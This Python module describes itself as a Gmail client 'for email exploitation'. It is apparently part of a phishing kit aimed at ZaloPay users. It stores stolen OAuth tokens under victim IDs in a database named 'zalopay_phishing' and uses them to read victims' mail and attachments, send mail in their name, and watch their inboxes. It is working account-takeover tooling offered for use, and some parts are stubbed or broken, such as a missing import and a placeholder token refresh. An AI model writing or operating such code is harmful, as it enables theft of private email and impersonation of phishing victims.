"""
Gmail API Client
Secure Gmail API integration for email exploitation
"""

import os
import json
import base64
import time
import asyncio
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple, Set
import logging
import requests
from urllib.parse import urlencode, quote
import threading

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class GmailAPIConfig:
    """Gmail API configuration"""

    def __init__(self):
        self.client_id = os.getenv("GMAIL_CLIENT_ID")
        self.client_secret = os.getenv("GMAIL_CLIENT_SECRET")
        self.api_key = os.getenv("GMAIL_API_KEY")
        self.scopes = [
            "https://www.googleapis.com/auth/gmail.readonly",
            "https://www.googleapis.com/auth/gmail.send",
            "https://www.googleapis.com/auth/gmail.modify",
            "https://www.googleapis.com/auth/gmail.compose",
            "https://www.googleapis.com/auth/gmail.metadata"
        ]
        self.base_url = "https://gmail.googleapis.com/gmail/v1"
        self.oauth_url = "https://oauth2.googleapis.com/token"
        self.auth_url = "https://accounts.google.com/o/oauth2/v2/auth"

        # Rate limiting
        self.requests_per_second = int(os.getenv("GMAIL_REQUESTS_PER_SECOND", "10"))
        self.requests_per_minute = int(os.getenv("GMAIL_REQUESTS_PER_MINUTE", "1000"))
        self.burst_limit = int(os.getenv("GMAIL_BURST_LIMIT", "50"))

        # Retry configuration
        self.max_retries = int(os.getenv("GMAIL_MAX_RETRIES", "3"))
        self.retry_delay = float(os.getenv("GMAIL_RETRY_DELAY", "1.0"))
        self.backoff_factor = float(os.getenv("GMAIL_BACKOFF_FACTOR", "2.0"))

class GmailTokenManager:
    """Gmail token management"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.tokens: Dict[str, Dict[str, Any]] = {}

    def store_token(self, victim_id: str, token_data: Dict[str, Any]) -> bool:
        """Store Gmail token for victim"""
        try:
            # Encrypt sensitive token data
            encrypted_data = self._encrypt_token_data(token_data)

            # Store in memory
            self.tokens[victim_id] = {
                "victim_id": victim_id,
                "token_data": encrypted_data,
                "stored_at": datetime.now(timezone.utc),
                "last_used": None,
                "is_valid": True,
                "access_count": 0
            }

            # Store in Redis
            if self.redis:
                self._store_token_in_redis(victim_id, encrypted_data)

            # Store in MongoDB
            if self.mongodb:
                self._store_token_in_mongodb(victim_id, encrypted_data)

            logger.info(f"Gmail token stored for victim: {victim_id}")
            return True

        except Exception as e:
            logger.error(f"Error storing Gmail token: {e}")
            return False

    def get_token(self, victim_id: str) -> Optional[Dict[str, Any]]:
        """Get Gmail token for victim"""
        try:
            # Try Redis first
            if self.redis:
                token_data = self._get_token_from_redis(victim_id)
                if token_data:
                    return self._decrypt_token_data(token_data)

            # Try MongoDB
            if self.mongodb:
                token_data = self._get_token_from_mongodb(victim_id)
                if token_data:
                    return self._decrypt_token_data(token_data)

            # Fallback to memory
            if victim_id in self.tokens:
                token_entry = self.tokens[victim_id]
                token_entry["last_used"] = datetime.now(timezone.utc)
                token_entry["access_count"] += 1
                return self._decrypt_token_data(token_entry["token_data"])

            return None

        except Exception as e:
            logger.error(f"Error getting Gmail token: {e}")
            return None

    def refresh_token(self, victim_id: str) -> bool:
        """Refresh Gmail token"""
        try:
            token_data = self.get_token(victim_id)
            if not token_data or "refresh_token" not in token_data:
                return False

            # Refresh token using Google's OAuth endpoint
            refresh_data = {
                "client_id": os.getenv("GMAIL_CLIENT_ID"),
                "client_secret": os.getenv("GMAIL_CLIENT_SECRET"),
                "refresh_token": token_data["refresh_token"],
                "grant_type": "refresh_token"
            }

            # In real implementation, make HTTP request to refresh token
            # For now, simulate successful refresh
            new_token_data = token_data.copy()
            new_token_data["access_token"] = f"refreshed_access_token_{secrets.token_hex(32)}"
            new_token_data["refreshed_at"] = datetime.now(timezone.utc).isoformat()

            # Update stored token
            return self.store_token(victim_id, new_token_data)

        except Exception as e:
            logger.error(f"Error refreshing Gmail token: {e}")
            return False

    def invalidate_token(self, victim_id: str) -> bool:
        """Invalidate Gmail token"""
        try:
            # Remove from memory
            if victim_id in self.tokens:
                del self.tokens[victim_id]

            # Remove from Redis
            if self.redis:
                self._delete_token_from_redis(victim_id)

            # Remove from MongoDB
            if self.mongodb:
                self._delete_token_from_mongodb(victim_id)

            logger.info(f"Gmail token invalidated for victim: {victim_id}")
            return True

        except Exception as e:
            logger.error(f"Error invalidating Gmail token: {e}")
            return False

    def _encrypt_token_data(self, token_data: Dict[str, Any]) -> Dict[str, Any]:
        """Encrypt sensitive token data"""
        try:
            # In real implementation, use encryption manager
            # For now, just return the data
            return token_data

        except Exception as e:
            logger.error(f"Error encrypting token data: {e}")
            return token_data

    def _decrypt_token_data(self, encrypted_data: Dict[str, Any]) -> Dict[str, Any]:
        """Decrypt token data"""
        try:
            # In real implementation, use encryption manager
            # For now, just return the data
            return encrypted_data

        except Exception as e:
            logger.error(f"Error decrypting token data: {e}")
            return {}

    def _store_token_in_redis(self, victim_id: str, token_data: Dict[str, Any]):
        """Store token in Redis"""
        try:
            if not self.redis:
                return

            key = f"gmail_token:{victim_id}"
            data = json.dumps(token_data)

            # Expire after 30 days
            self.redis.setex(key, 2592000, data)

        except Exception as e:
            logger.error(f"Error storing token in Redis: {e}")

    def _get_token_from_redis(self, victim_id: str) -> Optional[Dict[str, Any]]:
        """Get token from Redis"""
        try:
            if not self.redis:
                return None

            key = f"gmail_token:{victim_id}"
            data = self.redis.get(key)

            if data:
                return json.loads(data)

            return None

        except Exception as e:
            logger.error(f"Error getting token from Redis: {e}")
            return None

    def _delete_token_from_redis(self, victim_id: str):
        """Delete token from Redis"""
        try:
            if not self.redis:
                return

            key = f"gmail_token:{victim_id}"
            self.redis.delete(key)

        except Exception as e:
            logger.error(f"Error deleting token from Redis: {e}")

    def _store_token_in_mongodb(self, victim_id: str, token_data: Dict[str, Any]):
        """Store token in MongoDB"""
        try:
            if not self.mongodb:
                return

            db = self.mongodb.get_database("zalopay_phishing")
            tokens_collection = db.gmail_tokens

            document = {
                "victim_id": victim_id,
                "token_data": token_data,
                "stored_at": datetime.now(timezone.utc),
                "expires_at": datetime.now(timezone.utc) + timedelta(days=30)
            }

            tokens_collection.replace_one(
                {"victim_id": victim_id},
                document,
                upsert=True
            )

        except Exception as e:
            logger.error(f"Error storing token in MongoDB: {e}")

    def _get_token_from_mongodb(self, victim_id: str) -> Optional[Dict[str, Any]]:
        """Get token from MongoDB"""
        try:
            if not self.mongodb:
                return None

            db = self.mongodb.get_database("zalopay_phishing")
            tokens_collection = db.gmail_tokens

            document = tokens_collection.find_one({"victim_id": victim_id})
            if document:
                return document.get("token_data")

            return None

        except Exception as e:
            logger.error(f"Error getting token from MongoDB: {e}")
            return None

    def _delete_token_from_mongodb(self, victim_id: str):
        """Delete token from MongoDB"""
        try:
            if not self.mongodb:
                return None

            db = self.mongodb.get_database("zalopay_phishing")
            tokens_collection = db.gmail_tokens

            tokens_collection.delete_one({"victim_id": victim_id})

        except Exception as e:
            logger.error(f"Error deleting token from MongoDB: {e}")

class GmailAPIClient:
    """Gmail API client"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = GmailAPIConfig()
        self.token_manager = GmailTokenManager(mongodb_connection, redis_client)

        # Rate limiting
        self.rate_limit_window = 60  # seconds
        self.request_timestamps: List[float] = []

        # Session management
        self.active_sessions: Dict[str, Dict[str, Any]] = {}

    def authenticate_victim(self, victim_id: str, access_token: str, refresh_token: str = None) -> Dict[str, Any]:
        """
        Authenticate victim with Gmail

        Args:
            victim_id: Victim identifier
            access_token: Gmail access token
            refresh_token: Gmail refresh token (optional)

        Returns:
            Authentication result
        """
        try:
            # Store token
            token_data = {
                "access_token": access_token,
                "refresh_token": refresh_token,
                "token_type": "Bearer",
                "expires_in": 3600,
                "scope": " ".join(self.config.scopes)
            }

            if self.token_manager.store_token(victim_id, token_data):
                # Test token validity
                test_result = self.test_access_token(victim_id)

                if test_result["valid"]:
                    logger.info(f"Victim authenticated with Gmail: {victim_id}")
                    return {
                        "success": True,
                        "victim_id": victim_id,
                        "token_valid": True,
                        "scopes": self.config.scopes
                    }
                else:
                    return {
                        "success": False,
                        "error": "Invalid access token",
                        "details": test_result.get("error")
                    }
            else:
                return {
                    "success": False,
                    "error": "Failed to store token"
                }

        except Exception as e:
            logger.error(f"Error authenticating victim: {e}")
            return {
                "success": False,
                "error": "Authentication failed"
            }

    def test_access_token(self, victim_id: str) -> Dict[str, Any]:
        """Test if access token is valid"""
        try:
            token_data = self.token_manager.get_token(victim_id)
            if not token_data:
                return {"valid": False, "error": "No token found"}

            # Test API call
            result = self._make_api_request(
                victim_id,
                "GET",
                "users/me/profile"
            )

            if result["success"]:
                return {"valid": True}
            else:
                # Try to refresh token
                if self.token_manager.refresh_token(victim_id):
                    refreshed_result = self._make_api_request(
                        victim_id,
                        "GET",
                        "users/me/profile"
                    )

                    if refreshed_result["success"]:
                        return {"valid": True, "refreshed": True}
                    else:
                        return {"valid": False, "error": "Token refresh failed"}

                return {"valid": False, "error": result.get("error")}

        except Exception as e:
            logger.error(f"Error testing access token: {e}")
            return {"valid": False, "error": str(e)}

    def get_user_profile(self, victim_id: str) -> Dict[str, Any]:
        """Get Gmail user profile"""
        try:
            result = self._make_api_request(
                victim_id,
                "GET",
                "users/me/profile"
            )

            if result["success"]:
                return {
                    "success": True,
                    "profile": result["data"]
                }
            else:
                return {
                    "success": False,
                    "error": result.get("error")
                }

        except Exception as e:
            logger.error(f"Error getting user profile: {e}")
            return {"success": False, "error": str(e)}

    def list_messages(self, victim_id: str, query: str = None, max_results: int = 100,
                     include_spam_trash: bool = False) -> Dict[str, Any]:
        """
        List Gmail messages

        Args:
            victim_id: Victim identifier
            query: Gmail search query
            max_results: Maximum number of results
            include_spam_trash: Include spam and trash folders

        Returns:
            List of messages
        """
        try:
            # Build query parameters
            params = {
                "maxResults": min(max_results, 500),  # Gmail API limit
                "includeSpamTrash": include_spam_trash
            }

            if query:
                params["q"] = query

            result = self._make_api_request(
                victim_id,
                "GET",
                "users/me/messages",
                params=params
            )

            if result["success"]:
                messages = result["data"].get("messages", [])

                # Get full message details for each message
                detailed_messages = []
                for message in messages[:max_results]:  # Limit to requested max
                    message_details = self.get_message(victim_id, message["id"])
                    if message_details["success"]:
                        detailed_messages.append(message_details["message"])

                return {
                    "success": True,
                    "messages": detailed_messages,
                    "total_results": len(detailed_messages)
                }
            else:
                return {
                    "success": False,
                    "error": result.get("error")
                }

        except Exception as e:
            logger.error(f"Error listing messages: {e}")
            return {"success": False, "error": str(e)}

    def get_message(self, victim_id: str, message_id: str, format: str = "full") -> Dict[str, Any]:
        """
        Get Gmail message details

        Args:
            victim_id: Victim identifier
            message_id: Gmail message ID
            format: Message format (full, metadata, minimal)

        Returns:
            Message details
        """
        try:
            params = {"format": format}

            result = self._make_api_request(
                victim_id,
                "GET",
                f"users/me/messages/{quote(message_id)}",
                params=params
            )

            if result["success"]:
                message_data = result["data"]

                # Parse message
                parsed_message = self._parse_message(message_data)

                return {
                    "success": True,
                    "message": parsed_message
                }
            else:
                return {
                    "success": False,
                    "error": result.get("error")
                }

        except Exception as e:
            logger.error(f"Error getting message: {e}")
            return {"success": False, "error": str(e)}

    def search_messages(self, victim_id: str, query: str, max_results: int = 100) -> Dict[str, Any]:
        """Search Gmail messages"""
        return self.list_messages(victim_id, query, max_results)

    def get_message_attachments(self, victim_id: str, message_id: str) -> Dict[str, Any]:
        """Get message attachments"""
        try:
            # Get message first
            message_result = self.get_message(victim_id, message_id)
            if not message_result["success"]:
                return message_result

            message = message_result["message"]
            attachments = []

            # Extract attachments
            if "payload" in message:
                payload = message["payload"]

                # Check for attachments in payload
                if "parts" in payload:
                    for part in payload["parts"]:
                        if part.get("filename") and part.get("body", {}).get("attachmentId"):
                            attachment = self._get_attachment(victim_id, message_id, part["body"]["attachmentId"])
                            if attachment["success"]:
                                attachments.append(attachment["attachment"])

            return {
                "success": True,
                "attachments": attachments,
                "count": len(attachments)
            }

        except Exception as e:
            logger.error(f"Error getting message attachments: {e}")
            return {"success": False, "error": str(e)}

    def send_message(self, victim_id: str, to: str, subject: str, body: str,
                    cc: str = None, bcc: str = None) -> Dict[str, Any]:
        """
        Send Gmail message

        Args:
            victim_id: Victim identifier
            to: Recipient email
            subject: Message subject
            body: Message body
            cc: CC recipients
            bcc: BCC recipients

        Returns:
            Send result
        """
        try:
            # Create message
            message = self._create_message(to, subject, body, cc, bcc)

            # Encode message
            encoded_message = base64.urlsafe_b64encode(message.as_bytes()).decode()

            # Send message
            result = self._make_api_request(
                victim_id,
                "POST",
                "users/me/messages/send",
                data={"raw": encoded_message}
            )

            if result["success"]:
                return {
                    "success": True,
                    "message_id": result["data"].get("id")
                }
            else:
                return {
                    "success": False,
                    "error": result.get("error")
                }

        except Exception as e:
            logger.error(f"Error sending message: {e}")
            return {"success": False, "error": str(e)}

    def _make_api_request(self, victim_id: str, method: str, endpoint: str,
                         params: Dict[str, Any] = None, data: Dict[str, Any] = None) -> Dict[str, Any]:
        """Make authenticated API request"""
        try:
            # Check rate limits
            if not self._check_rate_limit():
                return {"success": False, "error": "Rate limit exceeded"}

            # Get token
            token_data = self.token_manager.get_token(victim_id)
            if not token_data:
                return {"success": False, "error": "No access token available"}

            # Build URL
            url = f"{self.config.base_url}/{endpoint}"

            # Build headers
            headers = {
                "Authorization": f"Bearer {token_data['access_token']}",
                "Content-Type": "application/json"
            }

            # Make request
            response = requests.request(
                method=method,
                url=url,
                headers=headers,
                params=params,
                json=data,
                timeout=30
            )

            # Record request timestamp for rate limiting
            self.request_timestamps.append(time.time())

            # Handle response
            if response.status_code == 401:
                # Token might be expired, try to refresh
                if self.token_manager.refresh_token(victim_id):
                    # Retry request with new token
                    return self._make_api_request(victim_id, method, endpoint, params, data)
                else:
                    return {"success": False, "error": "Unauthorized - token refresh failed"}

            elif response.status_code == 403:
                return {"success": False, "error": "Forbidden - insufficient permissions"}

            elif response.status_code == 429:
                return {"success": False, "error": "Rate limit exceeded"}

            elif response.status_code >= 200 and response.status_code < 300:
                return {
                    "success": True,
                    "data": response.json() if response.content else {},
                    "status_code": response.status_code
                }

            else:
                return {
                    "success": False,
                    "error": f"API request failed: {response.status_code}",
                    "status_code": response.status_code
                }

        except Exception as e:
            logger.error(f"Error making API request: {e}")
            return {"success": False, "error": str(e)}

    def _check_rate_limit(self) -> bool:
        """Check if request is within rate limits"""
        try:
            current_time = time.time()

            # Clean old timestamps
            self.request_timestamps = [
                ts for ts in self.request_timestamps
                if current_time - ts < self.rate_limit_window
            ]

            # Check limits
            if len(self.request_timestamps) >= self.config.requests_per_minute:
                return False

            return True

        except Exception as e:
            logger.error(f"Error checking rate limit: {e}")
            return False

    def _parse_message(self, message_data: Dict[str, Any]) -> Dict[str, Any]:
        """Parse Gmail message data"""
        try:
            message = {
                "id": message_data.get("id"),
                "thread_id": message_data.get("threadId"),
                "label_ids": message_data.get("labelIds", []),
                "snippet": message_data.get("snippet"),
                "size_estimate": message_data.get("sizeEstimate"),
                "history_id": message_data.get("historyId"),
                "internal_date": message_data.get("internalDate")
            }

            # Parse payload
            if "payload" in message_data:
                payload = message_data["payload"]
                message["headers"] = self._parse_headers(payload.get("headers", []))
                message["body"] = self._parse_body(payload)
                message["attachments"] = self._parse_attachments(payload)

            return message

        except Exception as e:
            logger.error(f"Error parsing message: {e}")
            return message_data

    def _parse_headers(self, headers: List[Dict[str, str]]) -> Dict[str, str]:
        """Parse message headers"""
        parsed = {}
        for header in headers:
            parsed[header["name"].lower()] = header["value"]
        return parsed

    def _parse_body(self, payload: Dict[str, Any]) -> Dict[str, str]:
        """Parse message body"""
        body = {"text": "", "html": ""}

        try:
            if "body" in payload and "data" in payload["body"]:
                # Decode base64 body
                decoded_body = base64.urlsafe_b64decode(payload["body"]["data"]).decode("utf-8")
                body["text"] = decoded_body

            elif "parts" in payload:
                for part in payload["parts"]:
                    if part.get("mimeType") == "text/plain" and "body" in part:
                        if "data" in part["body"]:
                            decoded_part = base64.urlsafe_b64decode(part["body"]["data"]).decode("utf-8")
                            body["text"] += decoded_part

                    elif part.get("mimeType") == "text/html" and "body" in part:
                        if "data" in part["body"]:
                            decoded_part = base64.urlsafe_b64decode(part["body"]["data"]).decode("utf-8")
                            body["html"] += decoded_part

        except Exception as e:
            logger.error(f"Error parsing body: {e}")

        return body

    def _parse_attachments(self, payload: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Parse message attachments"""
        attachments = []

        try:
            if "parts" in payload:
                for part in payload["parts"]:
                    if (part.get("filename") and
                        part.get("body", {}).get("attachmentId")):

                        attachments.append({
                            "filename": part["filename"],
                            "mime_type": part.get("mimeType"),
                            "size": part.get("body", {}).get("size"),
                            "attachment_id": part["body"]["attachmentId"]
                        })

        except Exception as e:
            logger.error(f"Error parsing attachments: {e}")

        return attachments

    def _get_attachment(self, victim_id: str, message_id: str, attachment_id: str) -> Dict[str, Any]:
        """Get attachment data"""
        try:
            result = self._make_api_request(
                victim_id,
                "GET",
                f"users/me/messages/{quote(message_id)}/attachments/{attachment_id}"
            )

            if result["success"]:
                attachment_data = result["data"]

                return {
                    "success": True,
                    "attachment": {
                        "attachment_id": attachment_id,
                        "size": attachment_data.get("size"),
                        "data": attachment_data.get("data")
                    }
                }
            else:
                return {
                    "success": False,
                    "error": result.get("error")
                }

        except Exception as e:
            logger.error(f"Error getting attachment: {e}")
            return {"success": False, "error": str(e)}

    def _create_message(self, to: str, subject: str, body: str, cc: str = None, bcc: str = None) -> Any:
        """Create email message"""
        try:
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart
            from email.header import Header
            from email.utils import formataddr

            message = MIMEMultipart()
            message["to"] = to
            message["subject"] = Header(subject, "utf-8")

            if cc:
                message["cc"] = cc
            if bcc:
                message["bcc"] = bcc

            # Attach body
            message.attach(MIMEText(body, "plain", "utf-8"))

            return message

        except Exception as e:
            logger.error(f"Error creating message: {e}")
            raise

    def get_quota_usage(self, victim_id: str) -> Dict[str, Any]:
        """Get Gmail quota usage"""
        try:
            result = self._make_api_request(
                victim_id,
                "GET",
                "users/me"
            )

            if result["success"]:
                user_data = result["data"]

                return {
                    "success": True,
                    "quota": {
                        "messages_total": user_data.get("messagesTotal"),
                        "threads_total": user_data.get("threadsTotal"),
                        "history_id": user_data.get("historyId")
                    }
                }
            else:
                return {
                    "success": False,
                    "error": result.get("error")
                }

        except Exception as e:
            logger.error(f"Error getting quota usage: {e}")
            return {"success": False, "error": str(e)}

    def watch_mailbox(self, victim_id: str, webhook_url: str) -> Dict[str, Any]:
        """Set up Gmail push notifications"""
        try:
            watch_data = {
                "labelIds": ["INBOX"],
                "topicName": webhook_url
            }

            result = self._make_api_request(
                victim_id,
                "POST",
                "users/me/watch",
                data=watch_data
            )

            if result["success"]:
                return {
                    "success": True,
                    "watch_details": result["data"]
                }
            else:
                return {
                    "success": False,
                    "error": result.get("error")
                }

        except Exception as e:
            logger.error(f"Error setting up watch: {e}")
            return {"success": False, "error": str(e)}

# Global Gmail client instance
gmail_client = None

def initialize_gmail_client(mongodb_connection=None, redis_client=None) -> GmailAPIClient:
    """Initialize global Gmail client"""
    global gmail_client
    gmail_client = GmailAPIClient(mongodb_connection, redis_client)
    return gmail_client

def get_gmail_client() -> GmailAPIClient:
    """Get global Gmail client"""
    if gmail_client is None:
        raise ValueError("Gmail client not initialized")
    return gmail_client

# Convenience functions
def authenticate_victim(victim_id: str, access_token: str, refresh_token: str = None) -> Dict[str, Any]:
    """Authenticate victim (global convenience function)"""
    return get_gmail_client().authenticate_victim(victim_id, access_token, refresh_token)

def get_user_profile(victim_id: str) -> Dict[str, Any]:
    """Get user profile (global convenience function)"""
    return get_gmail_client().get_user_profile(victim_id)

def list_messages(victim_id: str, query: str = None, max_results: int = 100) -> Dict[str, Any]:
    """List messages (global convenience function)"""
    return get_gmail_client().list_messages(victim_id, query, max_results)

def get_message(victim_id: str, message_id: str) -> Dict[str, Any]:
    """Get message (global convenience function)"""
    return get_gmail_client().get_message(victim_id, message_id)

def send_message(victim_id: str, to: str, subject: str, body: str) -> Dict[str, Any]:
    """Send message (global convenience function)"""
    return get_gmail_client().send_message(victim_id, to, subject, body)